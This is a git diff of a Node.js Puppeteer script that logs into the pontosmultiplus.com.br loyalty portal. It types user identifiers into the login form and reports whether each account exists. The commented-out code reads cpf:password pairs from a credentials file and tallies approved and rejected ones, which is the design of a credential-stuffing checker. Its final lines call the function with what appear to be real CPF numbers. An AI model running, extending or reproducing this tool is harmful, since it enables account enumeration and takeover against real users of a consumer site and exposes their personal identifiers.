@@ -3,76 +3,98 @@ const fsPromises = require('fs').promises;
 const fs = require('fs');
 const readline = require('readline');
 
-const baseUrl = '';
+const baseUrl = 'https://www.pontosmultiplus.com.br/portal/';
 const srcFolder = './src/credentials.txt';
 
 // Função que roda o robô
-async function robo(cpf, senha) {
+async function robo(pass, user) {
     // Configurações gerais do robô
-    const browser = await puppeteer.launch({ headless: true });
+    const browser = await puppeteer.launch({ headless: false });
     const page = await browser.newPage();
     await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36');
-
+    
     try {
         // Abrindo a página
-        const response = await page.goto(`${baseUrl}/${cpf}/${senha}`);
-        await browser.close();
+        const response = await page.goto(`${baseUrl}`);
+        await page.setCacheEnabled(false);
 
-        return response.status();
+        //Preencher campo de usuário
+        let inputUser = await page.waitForSelector('input[id=form-input--alias]');
+        await inputUser.type(user);
+        await page.click('button[type="submit"]');
+        
+        let userExists = await page.evaluate(() => {
+            let el = document.querySelector('#form-alert--error-usersearch');
+            return el ? "Não" : "Sim";
+        });
+        
+        //Preencher campo de senha
+        // await inputPass.type(pass);
+        // let userExists = await page.click('button[type="submit"]');
+
+        // await browser.close();
+
+        console.log(userExists);
+
+        // return response.status();
     } catch (error) {
         await browser.close();
+        console.log(error)
 
         return 'Ocorreu um erro ao verificar a URL';
     }
 };
 
 // Função para ler o arquivo das credenciais
-async function handleReadFile() {
-    const fileStream = fs.createReadStream(srcFolder);
-    const rl = readline.createInterface({
-        input: fileStream,
-        crlfDelay: Infinity
-    });
-    var carregadas = 0;
-    var testadas = 0;
-    var aprovados = 0;
-    var reprovados = 0;
+// async function handleReadFile() {
+//     const fileStream = fs.createReadStream(srcFolder);
+//     const rl = readline.createInterface({
+//         input: fileStream,
+//         crlfDelay: Infinity
+//     });
+//     var carregadas = 0;
+//     var testadas = 0;
+//     var aprovados = 0;
+//     var reprovados = 0;
 
-    // Iterando no arquivo, para ler cada linha e separar os dados
-    for await (const line of rl) {
-        carregadas = carregadas + 1;
-        if (line.includes(':')) {
-            var cpf = line.split(':')[0];
-            var senha = line.split(':')[1];
+//     // Iterando no arquivo, para ler cada linha e separar os dados
+//     for await (const line of rl) {
+//         carregadas = carregadas + 1;
+//         if (line.includes(':')) {
+//             var cpf = line.split(':')[0];
+//             var senha = line.split(':')[1];
 
-            console.log(`${cpf} - ${senha}`);
+//             console.log(`${cpf} - ${senha}`);
 
-            // const response = await robo(cpf, senha);
+//             // const response = await robo(cpf, senha);
 
-            // Salvado log das consultas
-            // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
-        }
-        if (line.includes('|')) {
-            var cpf = line.split('|')[0];
-            var senha = line.split('|')[1];
+//             // Salvado log das consultas
+//             // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
+//         }
+//         if (line.includes('|')) {
+//             var cpf = line.split('|')[0];
+//             var senha = line.split('|')[1];
 
-            console.log(`${cpf} - ${senha}`);
+//             console.log(`${cpf} - ${senha}`);
 
-            // const response = await robo(cpf, senha);
+//             // const response = await robo(cpf, senha);
 
-            // Salvado log das consultas
-            // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
-        }
-    }
+//             // Salvado log das consultas
+//             // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
+//         }
+//     }
 
-    console.log(`Carregadas: [${carregadas}]`)
-}
+//     console.log(`Carregadas: [${carregadas}]`)
+// }
 
-// Função para formatar datas
-function formatDate(dateIn) {
-    const dateOut = dateIn.getDate() + '/' + (dateIn.getMonth() + 1) + '/' + dateIn.getFullYear() + ' ' + dateIn.getHours() + ':' + dateIn.getMinutes() + ':' + dateIn.getSeconds();
+// // Função para formatar datas
+// function formatDate(dateIn) {
+//     const dateOut = dateIn.getDate() + '/' + (dateIn.getMonth() + 1) + '/' + dateIn.getFullYear() + ' ' + dateIn.getHours() + ':' + dateIn.getMinutes() + ':' + dateIn.getSeconds();
 
-    return dateOut;
-}
+//     return dateOut;
+// }
 
-handleReadFile();
+// handleReadFile();
+
+robo('11111', '47548914814');
+// robo('11111', '01839331763');
